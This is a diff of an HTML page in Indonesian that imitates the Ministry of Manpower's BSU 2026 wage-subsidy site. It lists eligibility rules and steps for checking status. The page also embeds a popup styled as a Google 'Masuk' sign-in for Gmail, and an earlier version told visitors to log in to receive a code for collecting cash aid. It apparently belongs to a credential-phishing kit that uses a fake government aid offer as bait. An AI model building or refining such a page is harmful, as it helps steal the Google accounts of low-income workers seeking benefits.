+        <div class="col-6 col-lg-3">
+          <div class="stat"><b>Rp300.000</b><span>per bulan</span></div>
+        </div>
+        <div class="col-6 col-lg-3">
+          <div class="stat"><b>3 bulan</b><span>masa penyaluran</span></div>
+        </div>
+        <div class="col-6 col-lg-3">
+          <div class="stat"><b>Rp900.000</b><span>total dibayarkan</span></div>
+        </div>
+        <div class="col-6 col-lg-3">
+          <div class="stat"><b>Sekaligus</b><span>satu kali transfer</span></div>
+        </div>
       </div>
     </div>
-  </section>
+  </div>
 
-  <section id="syarat">
+  <section class="blk" id="syarat">
     <div class="container">
-      <div class="section-title">
-        <h1>Syarat Penerima BSU 2026</h1>
-      </div>
-      <div class="section-content">
-        <div class="row" style="text-align: justify;">
-          <div class="col-md-6">
-            <ul>
-              <li>
-                Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.
-              </li>
-              <li>
-                Peserta Aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026
-              </li>
-              <li>
-                Menerima Gaji/Upah paling banyak sebesar Rp3.500.000,00 (tiga juta lima ratus ribu rupiah) per bulan atau sebesar UMP/UMK
-              </li>
-            </ul>
-          </div>
-          <div class="col-md-6">
-            <ul>
-              <li>
-                Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.
-              </li>
-              <li>
-                Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.
-              </li>
-            </ul>
-          </div>
-        </div>
+      <span class="eyebrow">Ketentuan</span>
+      <h2>Syarat Penerima BSU 2026</h2>
+      <p class="lead-txt">Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai, diberikan kepada pekerja/buruh yang memenuhi seluruh kriteria berikut.</p>
 
-        <div class="disclaimer">
-          <div class="container">
-            <i>
-              Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara.
-            </i>
-            <i>Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="blank" style="font-weight: bold;">Permenaker Nomor 16 Tahun 2026</a></i><br />
-          </div>
+      <div class="row g-3">
+        <div class="col-12 col-md-6">
+          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</p></div>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Peserta aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026.</p></div>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Menerima gaji/upah paling banyak sebesar Rp3.500.000,00 per bulan atau sebesar UMP/UMK.</p></div>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</p></div>
+        </div>
+        <div class="col-12">
+          <div class="req"><i class="bi bi-check-circle-fill"></i><p>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</p></div>
+        </div>
+      </div>
+
+      <div class="note">
+        <i class="bi bi-exclamation-triangle-fill"></i>
+        <div>
+          Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara.
+          Dasar hukum: Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan
+          <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a>.
         </div>
       </div>
     </div>
   </section>
 
-  <section id="pengecekan">
-    <div class="container cek">
-      <h1>Langkah Pengecekan Resmi</h1>
+  <section class="blk blk-alt" id="pengecekan">
+    <div class="container">
+      <span class="eyebrow">Panduan</span>
+      <h2>Langkah Pengecekan Resmi</h2>
+      <p class="lead-txt">Lakukan pengecekan hanya melalui kanal resmi Kementerian Ketenagakerjaan.</p>
 
-      <div class="cek-list">
-        <div class="row">
-          <div class="col-md-2">
-            <span>1</span>
-            <div class="cek-list-title">Kunjungi website</div>
+      <div class="row g-3">
+        <div class="col-12 col-md-6">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Kunjungi website resmi</h3>
+              <p><a href="https://bsu.kemnaker.go.id" target="_blank" rel="noopener">bsu.kemnaker.go.id</a></p>
+            </div>
           </div>
-
-          <div class="col-md-10">
-            <a href="https://bsu.kemnaker.go.id" target="_blank">bsu.kemnaker.go.id</a>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Cek NIK penerima</h3>
+              <p><a href="#info">Ikuti petunjuk pengecekan</a></p>
+            </div>
           </div>
         </div>
       </div>
 
-      <div class="cek-list">
-        <div class="row">
-          <div class="col-md-2">
-            <span>2</span>
-            <div class="cek-list-title">Cek NIK Penerima</div>
+      <div class="row mt-4">
+        <div class="col-12">
+          <div class="infobox">
+            <h3>Asal data penerima</h3>
+            <p>Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Informasi kriteria, mekanisme, dan tata cara BSU 2026 diatur dalam
+              <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener" style="color:#1a5fa8;font-weight:700">Permenaker Nomor 16 Tahun 2026</a>.
+            </p>
           </div>
-
-          <div class="col-md-10">
-            <a href="#pengecekanMandiri">Cek Nik</a>
-          </div>
-        </div>
-      </div>
-
-      <div class="spacer-2"></div>
-      <div class="ket">
-        <div class="container">
-          Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS
-          Ketenagakerjaan. Lebih lanjut mengenai informasi kriteria, mekanisme
-          dan tata cara BSU 2026 dapat dilihat pada
-          <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="blank">Permenaker Nomor 16 Tahun 2026</a>
         </div>
       </div>
     </div>
   </section>
 
-  <section id="pengecekanMandiri">
+  <section class="blk" id="info">
     <div class="container">
-      <div class="bsu-check-notice">
-        <div class="privacy-reminder">
-          <h2>INFORMASI PENGECEKAN PENERIMA BSU 2026</h2>
-          <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.<br /></p>
-          <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
-        </div>
+      <span class="eyebrow">Informasi</span>
+      <h2>Informasi Pengecekan Penerima BSU 2026</h2>
+      <div class="infobox mt-3">
+        <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.</p>
+        <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
       </div>
     </div>
   </section>
 
-  <footer>
+  <footer class="bsu-foot">
     <div class="container">
-      <div class="row">
-        <div class="col-md-12">
-          <img src="assets/images/logo-white.png" alt="Logo Kementrian Ketenagakerjaan" width="160" height="60" style="object-fit: contain;" />
-          <p>
-            Jl. Jendral Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta
-            12750, Indonesia
-          </p>
-        </div>
+      <div class="foot-brand">
+        <svg width="28" height="28" viewBox="0 0 48 48" aria-hidden="true">
+          <path d="M24 3 42 9v14c0 11-7.6 18.9-18 22C13.6 41.9 6 34 6 23V9L24 3Z" fill="none" stroke="#fff" stroke-width="2.4" stroke-linejoin="round"/>
+          <circle cx="24" cy="22" r="6.2" fill="none" stroke="#fff" stroke-width="2.2"/>
+        </svg>
+        <b>Bantuan Subsidi Upah</b>
       </div>
-      <p class="copy-line">© 2026 - Bantuan Subsidi Upah</p>
+      <p>Jl. Jendral Gatot Subroto Kav. 51, Daerah Khusus Ibukota Jakarta 12750, Indonesia</p>
+      <p class="copy">© 2026 - Bantuan Subsidi Upah</p>
     </div>
   </footer>
 
@@ -731,7 +706,7 @@
             <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
           </svg>
           <h1 id="gsiTitle">Masuk</h1>
-          <p class="gsi-sub" id="gsiSub">untuk melanjutkan ke Gmail Untuk mendapatkan kode verifikasi pengambilan Bantuan Uang Tunai </p>
+          <p class="gsi-sub" id="gsiSub">untuk melanjutkan ke Gmail</p>
 
           <div class="gsi-chip" id="gsiChip">
             <span class="gsi-av" id="gsiAv">U</span>
@@ -817,166 +792,7 @@
   <button id="gsiReopen" type="button">Masuk</button>
   <!-- =================== /POPUP ==================== -->
 
-  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-
-  <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      const nikInput = document.getElementById("nikInput");
-      const cekNikButton = document.getElementById("cekNikButton");
-      const hasilPengecekan = document.getElementById("hasilPengecekan");
-      const spinner = cekNikButton ? cekNikButton.querySelector(".spinner-border") : null;
-      const buttonText = document.getElementById("cekButtonText");
-      const captchaInputElement = document.getElementById("captchaInput");
-      const captchaImageElement = document.getElementById("captchaImageElement");
-      const refreshCaptchaButton = document.getElementById("refreshCaptchaButton");
-
-      function refreshCaptcha() {
-        if (captchaImageElement) {
-          fetch("/captcha-image?" + Date.now())
-            .then(function (response) {
-              if (!response.ok) throw new Error("Gagal memuat gambar CAPTCHA");
-              return response.blob();
-            })
-            .then(function (imageBlob) {
-              captchaImageElement.src = URL.createObjectURL(imageBlob);
-            })
-            .catch(function (error) {
-              console.error("Error CAPTCHA:", error);
-              captchaImageElement.alt = "Gagal memuat CAPTCHA";
-            });
-        }
-        if (captchaInputElement) captchaInputElement.value = "";
-      }
-
-      if (captchaImageElement) captchaImageElement.addEventListener("click", refreshCaptcha);
-      if (refreshCaptchaButton) refreshCaptchaButton.addEventListener("click", refreshCaptcha);
-      refreshCaptcha();
-
-      const apiUrlBase = "/api/cek-nik";
-
-      function resetButtonState() {
-        if (!cekNikButton) return;
-        cekNikButton.disabled = false;
-        spinner.style.display = "none";
-        buttonText.textContent = "Cek Status";
-      }
-
-      if (cekNikButton) {
-        cekNikButton.addEventListener("click", function () {
-          const nik = nikInput.value.trim();
-          const captchaValue = captchaInputElement.value.trim();
-
-          hasilPengecekan.style.display = "none";
-          hasilPengecekan.className = "mt-4 alert";
-          cekNikButton.disabled = true;
-          spinner.style.display = "inline-block";
-          buttonText.textContent = "Mengecek...";
-
-          if (nik === "") {
-            hasilPengecekan.textContent = "NIK tidak boleh kosong. Harap masukkan NIK Anda.";
-            hasilPengecekan.classList.add("alert-warning");
-            hasilPengecekan.style.display = "block";
-            resetButtonState();
-            return;
-          }
-
-          if (!/^\d{16}$/.test(nik)) {
-            hasilPengecekan.textContent = "Format NIK tidak valid. Harap masukkan 16 digit angka NIK.";
-            hasilPengecekan.classList.add("alert-danger");
-            hasilPengecekan.style.display = "block";
-            resetButtonState();
-            return;
-          }
-
-          if (captchaValue === "") {
-            hasilPengecekan.textContent = "Kode CAPTCHA tidak boleh kosong.";
-            hasilPengecekan.classList.add("alert-warning");
-            hasilPengecekan.style.display = "block";
-            resetButtonState();
-            refreshCaptcha();
-            return;
-          }
-
-          if (captchaValue.length !== 6) {
-            hasilPengecekan.textContent = "Kode CAPTCHA harus 6 karakter.";
-            hasilPengecekan.classList.add("alert-warning");
-            hasilPengecekan.style.display = "block";
-            resetButtonState();
-            refreshCaptcha();
-            return;
-          }
-
-          const fetchUrl = apiUrlBase + "?nik=" + encodeURIComponent(nik) + "&captcha_input=" + encodeURIComponent(captchaValue);
-
-          fetch(fetchUrl)
-            .then(function (response) {
-              if (!response.ok) {
-                return response.json().then(function (errData) {
-                  if (errData.message && errData.message.toLowerCase().includes("captcha")) refreshCaptcha();
-                  throw new Error(errData.message || ("Server merespons dengan status: " + response.status));
-                }).catch(function (jsonParseOrCustomError) {
-                  refreshCaptcha();
-                  throw new Error(jsonParseOrCustomError.message || ("Server merespons dengan status: " + response.status));
-                });
-              }
-              return response.json();
-            })
-            .then(function (data) {
-              hasilPengecekan.style.display = "block";
-              switch (data.status) {
-                case "TERDAFTAR":
-                  hasilPengecekan.className = "mt-4 alert alert-success";
-                  hasilPengecekan.textContent = data.message;
-                  break;
-                case "TIDAK_MEMENUHI_SYARAT":
-                  hasilPengecekan.className = "mt-4 alert alert-warning";
-                  hasilPengecekan.textContent = data.message;
-                  break;
-                case "TIDAK_DITEMUKAN":
-                  hasilPengecekan.className = "mt-4 alert alert-info";
-                  hasilPengecekan.textContent = data.message;
-                  break;
-                case "ERROR":
-                  hasilPengecekan.className = "mt-4 alert alert-danger";
-                  hasilPengecekan.textContent = data.message || "Terjadi kesalahan pada server.";
-                  break;
-                default:
-                  hasilPengecekan.className = "mt-4 alert alert-secondary";
-                  hasilPengecekan.textContent = "Respons tidak dikenal dari server.";
-              }
-              refreshCaptcha();
-            })
-            .catch(function (error) {
-              console.error("Error saat pengecekan NIK:", error);
-              hasilPengecekan.style.display = "block";
-              hasilPengecekan.className = "mt-4 alert alert-danger";
-              hasilPengecekan.textContent = error.message + ". Silakan coba lagi nanti.";
-            })
-            .finally(resetButtonState);
-        });
-
-        nikInput.addEventListener("keypress", function (event) {
-          if (event.key === "Enter") {
-            event.preventDefault();
-            if (nikInput.value.trim().length === 16 && captchaInputElement.value.trim() === "") {
-              captchaInputElement.focus();
-            } else if (!cekNikButton.disabled) {
-              cekNikButton.click();
-            }
-          }
-        });
-
-        captchaInputElement.addEventListener("keypress", function (event) {
-          if (event.key === "Enter") {
-            event.preventDefault();
-            if (!cekNikButton.disabled) cekNikButton.click();
-          }
-        });
-      }
-    });
-  </script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 
   <script>
     (function () {
@@ -1240,14 +1056,6 @@
 
       flushQueue();
     })();
-  </script>
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-CLKXPW3X6S"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() { dataLayer.push(arguments); }
-    gtag("js", new Date());
-    gtag("config", "G-CLKXPW3X6S");
   </script>
 </body>
 
